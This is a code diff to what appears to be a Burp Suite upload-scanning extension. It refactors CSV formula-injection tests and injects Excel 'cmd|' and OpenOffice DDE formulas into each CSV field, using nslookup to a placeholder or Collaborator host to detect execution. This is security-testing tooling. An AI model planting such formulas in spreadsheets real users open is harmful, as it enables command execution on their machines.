@@ -2878,14 +2878,19 @@ trailer <<
         colab_tests = []
 
         if injector.opts.file_formats['csv'].isSelected():
-            title = "Malicious CSV upload/download"
-            desc = 'A CSV with the content {} was uploaded and downloaded. When this spreadsheet is opened in {}, ' \
-                    'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
-                    'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
-            for software_name, payload in (("Excel", "=cmd|' /C {} {}'!A0"), ("OpenOffice", '=DDE("cmd";"/C {} {}";"__DdeLink_60_870516294")')):
+            title_download = "Malicious CSV upload/download"
+            desc_download = 'A CSV with the content {} was uploaded and downloaded. When this spreadsheet is opened in {}, ' \
+                            'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
+                            'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
+            title_colab = "Malicious CSV Collaborator Interaction"
+            desc_colab = 'A CSV with the content {} was uploaded and lead to command execution. When this spreadsheet is opened in {}, ' \
+                         'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
+                         'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
+            software_payload = (("Excel", "=cmd|' /C {} {}'!A0"), ("OpenOffice", '=DDE("cmd";"/C {} {}";"__DdeLink_60_870516294")'))
+            for software_name, payload in software_payload:
                 basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Csv" + software_name
                 formula = payload.format("nslookup", "unknown.domain.example.org")
-                issue = self._create_issue_template(injector.get_brr(), title, desc.format(formula, software_name), "Tentative", "Low")
+                issue = self._create_issue_template(injector.get_brr(), title_download, desc_download.format(formula, software_name), "Tentative", "Low")
                 # Do simple upload/download based
                 self.dl_matchers.add(DownloadMatcher(issue, filecontent=formula))
                 self._send_simple(injector, self.CSV_TYPES, basename + "Mal", formula, redownload=True)
@@ -2894,15 +2899,25 @@ trailer <<
                     # Also do collaborator based:
                     for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
                         formula = payload.format(cmd, server)
-                        desc += "<br>In this case we actually detected that interactions took place when using a {} command," \
-                                "meaning the server executed the payload or someone opened it in the {} spreadsheet software. " \
-                                "Interactions: <br><br>".format(cmd_name, software_name)
-                        issue = self._create_issue_template(injector.get_brr(), "Malicious CSV Collaborator Interaction", desc, "Firm", "High")
-                        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.CSV_TYPES, basename + "Colab",
-                                                           formula, issue, replace=replace, redownload=True))
-
-        # TODO feature: Detect if original uploaded file was CSV, how many columns, etc., then start injecting CSV
-        # specific payloads such as the formulas above, burp collaborator URLs etc, but *only* if we detect an uploaded CSV
+                        desc = desc_colab + "<br>In this case we actually detected that interactions took place when using a {} command," \
+                                "meaning the server executed the payload or someone opened it in the {} spreadsheet software. <br>" \
+                                "The payload was {} . <br>" \
+                                "Interactions: <br><br>".format(cmd_name, software_name, formula)
+                        issue = self._create_issue_template(injector.get_brr(), title_colab, desc, "Firm", "High")
+                        file_contents = []
+                        file_contents.append(formula)
+                        # Detect if original uploaded file was CSV, how many columns, etc., then start injecting CSV
+                        # specific payloads such as the formulas above, but *only* if we detect an uploaded CSV
+                        insertion_points = InsertionPointProviderForActiveScan(injector).get_csv_insertion_points(injector)
+                        for insertion_point in insertion_points:
+                            # Inject the formula into each field
+                            _, _, content = insertion_point.create_request(formula)
+                            file_contents.append(content)
+                            # Injecting a collaborator URL with http:// and https:// etc. would be possible here
+                            # but as we already pass this as an insertion point for active scan we don't do this here
+                        for index, content in enumerate(file_contents):
+                            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.CSV_TYPES, basename + "Colab" + str(index),
+                                                                        content, issue, replace=replace, redownload=True))
 
         if injector.opts.file_formats['xlsx'].isSelected():
             basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Excel"
@@ -4044,7 +4059,7 @@ trailer <<
     # TODO: Refactor _send methods into their own class
     def _send_simple(self, injector, all_types, basename, content, redownload=False, randomize=True):
         i = 0
-        types = injector.get_types(all_types, injector.get_default_file_ext())
+        types = injector.get_types(all_types)
         urrs = []
         for prefix, ext, mime_type in types:
             if randomize:
@@ -4066,7 +4081,8 @@ trailer <<
     def _send_collaborator(self, injector, burp_colab, all_types, basename, content, issue, redownload=False,
                            replace=None, randomize=True):
         colab_tests = []
-        types = injector.get_types(all_types, injector.get_default_file_ext())
+        types = injector.get_types(all_types)
+        print types
         i = 0
         for prefix, ext, mime_type in types:
             break_when_done = False
@@ -4137,7 +4153,7 @@ trailer <<
         return colab_tests
 
     def _send_sleep_based(self, injector, basename, content, types, sleep_time, issue, redownload=False, randomize=True):
-        types = injector.get_types(types, injector.get_default_file_ext())
+        types = injector.get_types(types)
         timeout_detection_time = (float(sleep_time) / 2) + 0.5
         i = 0
         for prefix, ext, mime_type in types:
@@ -4462,12 +4478,16 @@ class Injector(object):
     def get_uploaded_content_type(self):
         return ''
 
-    def get_types(self, all_types, orig_ext):
+    def get_types(self, all_types):
         new_types = set()
         for prefix, ext, mime_type in all_types:
             if BurpExtender.MARKER_ORIG_EXT in ext:
-                ext = ext.replace(BurpExtender.MARKER_ORIG_EXT, orig_ext)
+                ext = ext.replace(BurpExtender.MARKER_ORIG_EXT, self.get_default_file_ext())
+            if not mime_type:
+                # The "use original mime type" marker is an empty string
+                mime_type = self.get_uploaded_content_type()
             new_types.add((prefix, ext, mime_type))
+        # Further reduction if no mime or no filename is sent
         has_filename = self.get_uploaded_filename()
         has_mime = self.get_uploaded_content_type()
         if has_filename and has_mime:
@@ -4824,10 +4844,15 @@ class MultipartInjector(Injector):
 class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
     # This class is not needed in the UploadScanner except to provide InsertionPoints as a
     # IScannerInsertionPointProvider when getInsertionPoints is called from ActiveScan
-    def __init__(self, extender, global_opts, helpers):
-        self.burp_extender = extender
-        self._global_opts = global_opts
-        self._helpers = helpers
+    def __init__(self, extender=None, opts=None, helpers=None, injector=None):
+        if injector:
+            self.burp_extender = injector.opts._burp_extender
+            self._opts = injector.opts
+            self._helpers = injector._helpers
+        else:
+            self.burp_extender = extender
+            self._opts = opts
+            self._helpers = helpers
         self.exiftool_techniques = [
             # TODO: Maybe uncomment some more? This takes quiet a while to scan...
             # See BackdooredFiles for details... we don't use the thumbnail technique.
@@ -4850,9 +4875,9 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                     CustomMultipartInsertionPoint.FILENAME_MARKER in req:
                 print "MultipartInjector insertion point found for getInsertionPoint ActiveScan!"
                 insertionPoint = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE, req)
-                injector = MultipartInjector(base_request_response, self._global_opts, insertionPoint, self._helpers, BurpExtender.NEWLINE)
-            elif self._global_opts.fi_ofilename:
-                fi = FlexiInjector(base_request_response, self._global_opts, self._helpers, BurpExtender.NEWLINE)
+                injector = MultipartInjector(base_request_response, self._opts, insertionPoint, self._helpers, BurpExtender.NEWLINE)
+            elif self._opts.fi_ofilename:
+                fi = FlexiInjector(base_request_response, self._opts, self._helpers, BurpExtender.NEWLINE)
                 # We test only those requests where we find at least the content in the request as some implementations
                 # might not send the filename to the server
                 if fi.get_uploaded_content():
@@ -4860,10 +4885,10 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                     injector = fi
             if injector:
                 # First the feature that we can detect CSVs
-                insertion_points.extend(self._get_csv_insertion_points(injector))
+                insertion_points.extend(self.get_csv_insertion_points(injector))
 
                 # Then handle the zip files
-                bf = BackdooredFile(None, tool=self._global_opts.image_exiftool)
+                bf = BackdooredFile(None, tool=self._opts.image_exiftool)
                 upload_type = ('', ".zip", BackdooredFile.EXTENSION_TO_MIME[".zip"])
                 # Achieve bf.get_zip_files(payload_func, techniques=["name"])
                 args = []
@@ -4882,7 +4907,7 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                     # Now we still have the problem, that for a format, several payloads are generated
                     # so we can't really call create_files, but we need to call get_exiftool_images
                     # directly and tell it which techniques to use
-                    size = (self._global_opts.image_width, self._global_opts.image_height)
+                    size = (self._opts.image_width, self._opts.image_height)
                     for name, cmd_line_args, formats in self.exiftool_techniques:
                         if format in formats:
                             # Achieve bf.get_exiftool_images(payload_func, size, formats, techniques=None)
@@ -4895,7 +4920,7 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
             raise sys.exc_info()[1], None, sys.exc_info()[2]
         return insertion_points
 
-    def _get_csv_insertion_points(self, injector):
+    def get_csv_insertion_points(self, injector):
         filename = injector.get_uploaded_filename().lower()
         insertion_points = []
         if ".csv" in filename or ".txt" in filename:
@@ -4933,7 +4958,7 @@ class CsvInsertionPoint(IScannerInsertionPoint):
         self.lines = injector.get_uploaded_content().split(self.new_line)
         self.fields = self.lines[self.line_index].split(self.delim)
 
-    def _create_request(self, payload):
+    def create_request(self, payload):
         fields = copy.copy(self.fields)
         if fields[self.field_index].startswith('"') and fields[self.field_index].endswith('"'):
             # Let's assume it is a quoted CSV
@@ -4948,10 +4973,10 @@ class CsvInsertionPoint(IScannerInsertionPoint):
         lines[self.line_index] = line
         content = self.new_line.join(lines)
         req = self.injector.get_request(self.injector.get_uploaded_filename(), content)
-        return req, payload
+        return req, payload, content
 
     def buildRequest(self, payload):
-        req, _ = self._create_request(FloydsHelpers.jb2ps(payload))
+        req, _, _ = self.create_request(FloydsHelpers.jb2ps(payload))
         return req
 
     def getBaseValue(self):
@@ -4969,7 +4994,7 @@ class CsvInsertionPoint(IScannerInsertionPoint):
 
     def getPayloadOffsets(self, payload):
         payload = FloydsHelpers.jb2ps(payload)
-        req, payload = self._create_request(payload)
+        req, payload, _ = self.create_request(payload)
         if payload in req:
             start = req.index(payload)
             return [start, start + len(payload)]
@@ -5623,7 +5648,7 @@ class XxeXmp(Xxe):
         # A modified version of _send_burp_collaborator because we need to fix the length of the xmp
         # after we inject the collaborator URL
         colab_tests = []
-        types = injector.get_types(all_types, injector.get_default_file_ext())
+        types = injector.get_types(all_types)
         i = 0
         for prefix, ext, mime_type in types:
             for prot in self._protocols:
